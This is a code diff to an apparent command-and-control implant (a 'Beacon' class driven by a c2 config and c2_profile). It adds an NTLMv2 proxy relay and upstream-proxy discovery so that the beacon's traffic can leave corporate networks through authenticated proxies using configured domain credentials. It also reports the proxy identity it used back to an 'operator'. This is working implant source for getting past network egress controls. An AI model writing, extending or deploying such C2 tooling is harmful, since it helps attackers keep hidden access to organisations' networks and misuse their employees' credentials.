@@ -542,6 +542,423 @@ class _ProxyError(Exception):
     pass
 
 
+# ── NTLM Proxy Relay ──
+
+class _NtlmProxyRelay:
+    """Local CONNECT proxy that handles NTLMv2 auth to an upstream corporate proxy.
+
+    Listens on 127.0.0.1:<random-port>, accepts CONNECT requests from urllib,
+    performs the NTLM 3-step handshake on a single TCP connection to the upstream
+    proxy, then bridges the raw TCP tunnel bidirectionally.
+
+    This solves the problem where WinINet/urllib cannot do NTLM proxy auth with
+    cross-domain credentials (user is not in the proxy's AD domain).
+    """
+
+    # Header read guards — a hostile/broken proxy must not be able to make us
+    # allocate unbounded memory while parsing the CONNECT response.
+    _MAX_LINE = 8192
+    _MAX_HEADERS = 100
+    # Idle timeout for the handshake only. Cleared before bridging so that a
+    # long-lived tunnel is never torn down mid-transfer.
+    _HANDSHAKE_TIMEOUT = 30
+
+    def __init__(self, upstream_host: str, upstream_port: int,
+                 username: str, password: str, domain: str = "",
+                 workstation: str = ""):
+        self._upstream = (upstream_host, upstream_port)
+        self._user, self._domain = self._split_identity(username, domain)
+        self._password = password
+        self._workstation = (workstation or platform.node() or "WORKSTATION")
+        self._listen_port = 0
+        self._server: Optional[socket.socket] = None
+        self._thread: Optional[threading.Thread] = None
+        self._running = False
+
+    @staticmethod
+    def _split_identity(username: str, domain: str) -> tuple:
+        """Accept 'DOMAIN\\user', 'user@domain' or a separate domain argument."""
+        user = username or ""
+        if not domain:
+            if "\\" in user:
+                domain, user = user.split("\\", 1)
+            elif "/" in user:
+                domain, user = user.split("/", 1)
+            elif "@" in user:
+                user, domain = user.split("@", 1)
+        return user, domain or ""
+
+    @property
+    def port(self) -> int:
+        return self._listen_port
+
+    @property
+    def url(self) -> str:
+        return f"http://127.0.0.1:{self._listen_port}"
+
+    @property
+    def upstream_url(self) -> str:
+        return f"http://{self._upstream[0]}:{self._upstream[1]}"
+
+    @property
+    def identity(self) -> str:
+        return f"{self._domain}\\{self._user}" if self._domain else self._user
+
+    def start(self) -> int:
+        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self._server.bind(("127.0.0.1", 0))
+        self._listen_port = self._server.getsockname()[1]
+        self._server.listen(20)
+        self._running = True
+        self._thread = threading.Thread(
+            target=self._accept_loop, daemon=True, name="ntlm-proxy-relay")
+        self._thread.start()
+        logger.info("NTLM proxy relay on 127.0.0.1:%d -> %s:%d (identity: %s, workstation: %s)",
+                    self._listen_port, self._upstream[0], self._upstream[1],
+                    self.identity, self._workstation)
+        return self._listen_port
+
+    def stop(self):
+        self._running = False
+        if self._server:
+            try:
+                self._server.close()
+            except Exception:
+                pass
+            self._server = None
+        if self._thread:
+            self._thread.join(timeout=2)
+            self._thread = None
+
+    def _accept_loop(self):
+        while self._running:
+            try:
+                client, _ = self._server.accept()
+            except OSError:
+                # Listening socket closed by stop() — normal shutdown.
+                break
+            except Exception as e:
+                logger.debug("NTLM relay accept error: %s", e)
+                continue
+            try:
+                threading.Thread(
+                    target=self._handle_client, args=(client,), daemon=True).start()
+            except Exception as e:
+                logger.debug("NTLM relay spawn error: %s", e)
+                try:
+                    client.close()
+                except Exception:
+                    pass
+
+    def _handle_client(self, client: socket.socket):
+        upstream = None
+        try:
+            client.settimeout(self._HANDSHAKE_TIMEOUT)
+            request_line = self._read_line(client)
+            self._drain_headers(client)
+
+            if not request_line or not request_line.startswith("CONNECT"):
+                self._send_error(client, "405 Method Not Allowed")
+                return
+
+            parts = request_line.split(" ")
+            if len(parts) < 2:
+                self._send_error(client, "400 Bad Request")
+                return
+            target = parts[1]
+
+            upstream = self._connect_upstream()
+
+            # Step 1: CONNECT without auth. Either the proxy lets us straight
+            # through, or it answers 407 and offers NTLM.
+            self._send_connect(upstream, target, None)
+            status, challenge, closed = self._read_response(upstream)
+
+            if status and " 200" in status:
+                logger.debug("NTLM relay: upstream needs no auth for %s", target)
+                self._establish(client, upstream)
+                return
+
+            # Type 1 and Type 3 must travel over the same TCP connection. If the
+            # proxy closed it after the 407, open a fresh one.
+            if closed:
+                upstream.close()
+                upstream = self._connect_upstream()
+
+            # Step 2: CONNECT with Type 1 → expect 407 + Type 2 challenge.
+            type1 = self._make_type1()
+            self._send_connect(upstream, target,
+                               "NTLM " + base64.b64encode(type1).decode())
+            _, type2_b64, closed = self._read_response(upstream)
+
+            if not type2_b64:
+                logger.debug("NTLM relay: no Type 2 challenge from upstream proxy")
+                self._send_error(client, "502 Bad Gateway")
+                return
+            if closed:
+                logger.debug("NTLM relay: upstream closed connection mid-handshake")
+                self._send_error(client, "502 Bad Gateway")
+                return
+
+            # Step 3: CONNECT with Type 3 → expect 200.
+            try:
+                type2 = base64.b64decode(type2_b64)
+            except Exception:
+                logger.debug("NTLM relay: malformed Type 2 challenge")
+                self._send_error(client, "502 Bad Gateway")
+                return
+
+            type3 = self._make_type3(type2)
+            self._send_connect(upstream, target,
+                               "NTLM " + base64.b64encode(type3).decode())
+            status, _, _ = self._read_response(upstream)
+
+            if status and " 200" in status:
+                self._establish(client, upstream)
+            else:
+                logger.debug("NTLM relay: auth rejected by upstream (%s)", status)
+                self._send_error(client, "407 Proxy Authentication Required")
+        except Exception as e:
+            logger.debug("NTLM relay client error: %s", e)
+        finally:
+            try:
+                client.close()
+            except Exception:
+                pass
+            if upstream:
+                try:
+                    upstream.close()
+                except Exception:
+                    pass
+
+    def _connect_upstream(self) -> socket.socket:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(self._HANDSHAKE_TIMEOUT)
+        sock.connect(self._upstream)
+        return sock
+
+    def _establish(self, client: socket.socket, upstream: socket.socket):
+        """Confirm the tunnel to the local client and start bridging."""
+        client.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
+        # Blocking mode for the tunnel: the handshake timeout must not kill a
+        # long-lived or slow transfer.
+        client.settimeout(None)
+        upstream.settimeout(None)
+        self._bridge(client, upstream)
+
+    def _drain_headers(self, sock: socket.socket):
+        for _ in range(self._MAX_HEADERS):
+            if not self._read_line(sock):
+                return
+
+    def _send_connect(self, sock: socket.socket, target: str,
+                      auth: Optional[str]):
+        msg = f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n"
+        if auth:
+            msg += f"Proxy-Authorization: {auth}\r\n"
+        msg += "Proxy-Connection: Keep-Alive\r\n\r\n"
+        sock.sendall(msg.encode())
+
+    def _read_response(self, sock: socket.socket) -> tuple:
+        """Read a proxy response. Returns (status_line, ntlm_challenge, closed)."""
+        ntlm_challenge = None
+        status_line = self._read_line(sock)
+        body_len = 0
+        closed = False
+        for _ in range(self._MAX_HEADERS):
+            line = self._read_line(sock)
+            if not line:
+                break
+            lower = line.lower()
+            if lower.startswith("proxy-authenticate:") and "ntlm" in lower:
+                value = line.split(":", 1)[1].strip()
+                # "NTLM" alone is just the offer; "NTLM <base64>" is the challenge.
+                if len(value) > 5:
+                    ntlm_challenge = value[5:].strip() or None
+            elif lower.startswith("content-length:"):
+                try:
+                    body_len = int(line.split(":", 1)[1].strip())
+                except ValueError:
+                    pass
+            elif lower.startswith(("connection:", "proxy-connection:")):
+                if "close" in lower:
+                    closed = True
+        # Swallow any error body so the socket stays usable for the next step.
+        remaining = body_len
+        while remaining > 0:
+            chunk = sock.recv(min(remaining, 4096))
+            if not chunk:
+                closed = True
+                break
+            remaining -= len(chunk)
+        return status_line, ntlm_challenge, closed
+
+    def _bridge(self, s1: socket.socket, s2: socket.socket):
+        def forward(src, dst):
+            try:
+                while True:
+                    data = src.recv(8192)
+                    if not data:
+                        break
+                    dst.sendall(data)
+            except Exception:
+                pass
+            # Half-close the peer so it sees EOF and can finish its own direction.
+            try:
+                dst.shutdown(socket.SHUT_WR)
+            except Exception:
+                pass
+
+        t1 = threading.Thread(target=forward, args=(s1, s2), daemon=True)
+        t2 = threading.Thread(target=forward, args=(s2, s1), daemon=True)
+        t1.start()
+        t2.start()
+        # Wait for BOTH directions. Joining only one would let the caller's
+        # finally-block close the sockets and truncate the in-flight response.
+        t1.join()
+        t2.join()
+
+    def _read_line(self, sock: socket.socket) -> Optional[str]:
+        buf = []
+        while len(buf) < self._MAX_LINE:
+            b = sock.recv(1)
+            if not b:
+                return None if not buf else "".join(buf)
+            c = b[0]
+            if c == 10:  # LF
+                break
+            if c != 13:  # skip CR
+                buf.append(chr(c))
+        return "".join(buf)
+
+    def _send_error(self, sock: socket.socket, status: str):
+        try:
+            sock.sendall(
+                f"HTTP/1.1 {status}\r\nContent-Length: 0\r\n"
+                f"Connection: close\r\n\r\n".encode())
+        except Exception:
+            pass
+
+    # ── NTLMv2 message construction (stdlib only, no dependencies) ──
+
+    # NEGOTIATE_UNICODE | NEGOTIATE_OEM | REQUEST_TARGET | NEGOTIATE_NTLM
+    # | NEGOTIATE_ALWAYS_SIGN | NEGOTIATE_EXTENDED_SESSIONSECURITY
+    _NEGOTIATE_FLAGS_TYPE1 = 0x00088207
+    # Same minus OEM/REQUEST_TARGET — unicode only for the authenticate message.
+    _NEGOTIATE_FLAGS_TYPE3 = 0x00088201
+
+    def _make_type1(self) -> bytes:
+        msg = bytearray(32)
+        msg[0:7] = b"NTLMSSP"
+        msg[8] = 1  # Type 1
+        struct.pack_into("<I", msg, 12, self._NEGOTIATE_FLAGS_TYPE1)
+        return bytes(msg)
+
+    def _make_type3(self, type2: bytes) -> bytes:
+        if len(type2) < 32 or not type2.startswith(b"NTLMSSP\x00"):
+            raise ValueError("invalid NTLM Type 2 message")
+
+        challenge = type2[24:32]
+        target_info = b""
+        if len(type2) >= 48:
+            ti_len = struct.unpack_from("<H", type2, 40)[0]
+            ti_off = struct.unpack_from("<I", type2, 44)[0]
+            if ti_off + ti_len <= len(type2):
+                target_info = type2[ti_off:ti_off + ti_len]
+
+        # NTLMv2: the identity blob is upper(user) + domain, domain NOT uppercased.
+        nt_hash = self._md4(self._password.encode("utf-16-le"))
+        identity = (self._user.upper() + self._domain).encode("utf-16-le")
+        ntv2_hash = self._hmac_md5(nt_hash, identity)
+
+        client_challenge = os.urandom(8)
+        timestamp = struct.pack("<Q", int((time.time() + 11644473600) * 10000000))
+
+        blob = io.BytesIO()
+        blob.write(b"\x01\x01\x00\x00")  # RespType 1, HiRespType 1, Z(2)
+        blob.write(b"\x00" * 4)           # Z(4)
+        blob.write(timestamp)
+        blob.write(client_challenge)
+        blob.write(b"\x00" * 4)           # Z(4)
+        blob.write(target_info)
+        blob.write(b"\x00" * 4)           # Z(4)
+        blob_bytes = blob.getvalue()
+
+        nt_proof = self._hmac_md5(ntv2_hash, challenge + blob_bytes)
+        nt_response = nt_proof + blob_bytes
+
+        domain_bytes = self._domain.encode("utf-16-le")
+        user_bytes = self._user.encode("utf-16-le")
+        ws_bytes = self._workstation.upper().encode("utf-16-le")
+        # EncryptedRandomSessionKey stays empty: we never set NEGOTIATE_KEY_EXCH,
+        # and a populated field without that flag makes some proxies reject us.
+        session_key = b""
+
+        # Payload starts after the 64-byte header + 8-byte Version + 16-byte MIC.
+        payload_off = 88
+        domain_off = payload_off
+        user_off = domain_off + len(domain_bytes)
+        ws_off = user_off + len(user_bytes)
+        lm_off = ws_off + len(ws_bytes)
+        nt_off = lm_off  # LM response is empty, so it shares the offset
+        sk_off = nt_off + len(nt_response)
+
+        msg = bytearray(sk_off + len(session_key))
+        msg[0:7] = b"NTLMSSP"
+        msg[8] = 3  # Type 3
+        struct.pack_into("<I", msg, 60, self._NEGOTIATE_FLAGS_TYPE3)
+        struct.pack_into("<HHI", msg, 12, 0, 0, lm_off)  # LM response (empty)
+        struct.pack_into("<HHI", msg, 20, len(nt_response), len(nt_response), nt_off)
+        struct.pack_into("<HHI", msg, 28, len(domain_bytes), len(domain_bytes), domain_off)
+        struct.pack_into("<HHI", msg, 36, len(user_bytes), len(user_bytes), user_off)
+        struct.pack_into("<HHI", msg, 44, len(ws_bytes), len(ws_bytes), ws_off)
+        struct.pack_into("<HHI", msg, 52, len(session_key), len(session_key), sk_off)
+
+        msg[domain_off:domain_off + len(domain_bytes)] = domain_bytes
+        msg[user_off:user_off + len(user_bytes)] = user_bytes
+        msg[ws_off:ws_off + len(ws_bytes)] = ws_bytes
+        msg[nt_off:nt_off + len(nt_response)] = nt_response
+        return bytes(msg)
+
+    @staticmethod
+    def _hmac_md5(key: bytes, data: bytes) -> bytes:
+        import hmac as _hmac
+        return _hmac.new(key, data, hashlib.md5).digest()
+
+    @staticmethod
+    def _md4(data: bytes) -> bytes:
+        """Pure-Python MD4 (needed for NT hash, not available in hashlib)."""
+        def _rl(x, n):
+            return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
+        def _r1(a, b, c, d, x, s):
+            return _rl((a + ((b & c) | (~b & d)) + x) & 0xFFFFFFFF, s)
+        def _r2(a, b, c, d, x, s):
+            return _rl((a + ((b & c) | (b & d) | (c & d)) + x + 0x5A827999) & 0xFFFFFFFF, s)
+        def _r3(a, b, c, d, x, s):
+            return _rl((a + (b ^ c ^ d) + x + 0x6ED9EBA1) & 0xFFFFFFFF, s)
+
+        length = len(data)
+        pad_len = (56 - (length + 1) % 64 + 64) % 64
+        padded = data + b"\x80" + b"\x00" * pad_len + struct.pack("<Q", length * 8)
+
+        st = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476]
+        for i in range(0, len(padded), 64):
+            x = struct.unpack_from("<16I", padded, i)
+            a, b, c, d = st
+            for j in range(16):
+                a, b, c, d = d, _r1(a, b, c, d, x[j], [3,7,11,19][j%4]), b, c
+            for j in range(16):
+                idx = [0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15][j]
+                a, b, c, d = d, _r2(a, b, c, d, x[idx], [3,5,9,13][j%4]), b, c
+            for j in range(16):
+                idx = [0,8,4,12,2,10,6,14,1,9,5,13,3,11,7,15][j]
+                a, b, c, d = d, _r3(a, b, c, d, x[idx], [3,9,11,15][j%4]), b, c
+            st = [(st[0]+a) & 0xFFFFFFFF, (st[1]+b) & 0xFFFFFFFF,
+                  (st[2]+c) & 0xFFFFFFFF, (st[3]+d) & 0xFFFFFFFF]
+        return struct.pack("<4I", *st)
+
+
 # ── Proxy discovery ──
 
 class ProxyDiscovery:
@@ -903,9 +1320,11 @@ class Beacon:
         proxy_cfg = c2.get("proxy", {})
         self.proxy_mode = proxy_cfg.get("mode", "auto")
         self.proxy_url = proxy_cfg.get("url", "")
+        self._proxy_ntlm_cfg = proxy_cfg.get("ntlm", {})
 
         self._proxy = ProxyDiscovery()
         self._proxy_session: Optional[_HttpSession] = None
+        self._ntlm_relay: Optional[_NtlmProxyRelay] = None
 
         self._c2_profile = c2.get("c2_profile", {})
 
@@ -1031,7 +1450,11 @@ class Beacon:
             "local_ips": self._get_local_ips(),
             "proxy_mode": self.proxy_mode,
         }
-        if self._proxy._active_proxy:
+        if self._ntlm_relay:
+            # Report the real upstream, not the local relay port — the operator
+            # cares about which corporate proxy the traffic exits through.
+            info["proxy_active"] = f"{self._ntlm_relay.upstream_url} (NTLM: {self._ntlm_relay.identity})"
+        elif self._proxy._active_proxy:
             info["proxy_active"] = self._proxy._active_proxy["url"]
         elif self._proxy_session and self._proxy_session.proxies:
             info["proxy_active"] = next(iter(self._proxy_session.proxies.values()), "none")
@@ -2732,6 +3155,15 @@ class Beacon:
         lines = [f"Proxy mode: {self.proxy_mode}"]
         if self.proxy_url:
             lines.append(f"Configured URL: {self.proxy_url}")
+        if self._ntlm_relay:
+            lines.append("")
+            lines.append("NTLM relay: active")
+            lines.append(f"  Local listener: {self._ntlm_relay.url}")
+            lines.append(f"  Upstream proxy: {self._ntlm_relay.upstream_url}")
+            lines.append(f"  Identity:       {self._ntlm_relay.identity}")
+        elif self._proxy_ntlm_cfg.get("enabled"):
+            lines.append("")
+            lines.append("NTLM relay: configured but not running")
         lines.append("")
         lines.append(self._proxy.summary())
         if self._proxy_session and self._proxy_session.proxies:
@@ -3607,6 +4039,9 @@ class Beacon:
             logger.info("Proxy: disabled (direct connection)")
             return
 
+        if self._start_ntlm_relay():
+            return
+
         if self.proxy_mode == "manual" and self.proxy_url:
             self._proxy_session.proxies = {
                 "http": self.proxy_url, "https": self.proxy_url,
@@ -3629,6 +4064,71 @@ class Beacon:
             logger.info("Proxy: none discovered, using direct connection")
         self._proxy_session.trust_env = True
 
+    def _start_ntlm_relay(self) -> bool:
+        """Start the local NTLM relay if configured. Returns True on success."""
+        cfg = self._proxy_ntlm_cfg
+        if not cfg.get("enabled"):
+            return False
+
+        username = cfg.get("username", "")
+        password = cfg.get("password", "")
+        if not username or not password:
+            logger.warning("Proxy: NTLM enabled but username/password missing — skipping relay")
+            return False
+
+        host = cfg.get("host", "")
+        port = int(cfg.get("port", 8080) or 8080)
+        if not host:
+            # No explicit upstream: reuse whatever the discovery found.
+            host, port = self._discover_ntlm_upstream(port)
+            if not host:
+                logger.warning("Proxy: NTLM enabled but no upstream proxy configured "
+                               "or discovered — skipping relay")
+                return False
+            logger.info("Proxy: NTLM upstream auto-discovered as %s:%d", host, port)
+
+        try:
+            relay = _NtlmProxyRelay(
+                host, port, username, password,
+                domain=cfg.get("domain", ""),
+                workstation=cfg.get("workstation", ""),
+            )
+            relay.start()
+        except Exception as e:
+            logger.warning("Proxy: NTLM relay failed to start (%s) — falling back", e)
+            return False
+
+        self._ntlm_relay = relay
+        self._proxy_session.proxies = {"http": relay.url, "https": relay.url}
+        logger.info("Proxy: NTLM relay %s -> %s (identity: %s)",
+                    relay.url, relay.upstream_url, relay.identity)
+        return True
+
+    def _discover_ntlm_upstream(self, default_port: int) -> tuple:
+        """Find an upstream proxy host/port for the NTLM relay."""
+        candidates = []
+        if self.proxy_url:
+            candidates.append(self.proxy_url)
+        try:
+            for proxy in self._proxy.discover_all():
+                if not proxy.get("is_pac") and proxy.get("url"):
+                    candidates.append(proxy["url"])
+        except Exception as e:
+            logger.debug("NTLM upstream discovery failed: %s", e)
+
+        for url in candidates:
+            netloc = url.split("://", 1)[-1].rstrip("/")
+            if "@" in netloc:
+                netloc = netloc.rsplit("@", 1)[1]
+            host, _, port_str = netloc.partition(":")
+            if not host or host.startswith("127."):
+                continue
+            try:
+                return host, int(port_str) if port_str else default_port
+            except ValueError:
+                return host, default_port
+        return "", default_port
+
     def start(self):
         self._running = True
         self._init_proxy()
@@ -3641,4 +4141,7 @@ class Beacon:
         self._running = False
         if self._thread:
             self._thread.join(timeout=5)
+        if self._ntlm_relay:
+            self._ntlm_relay.stop()
+            self._ntlm_relay = None
         logger.info("Beacon stopped")
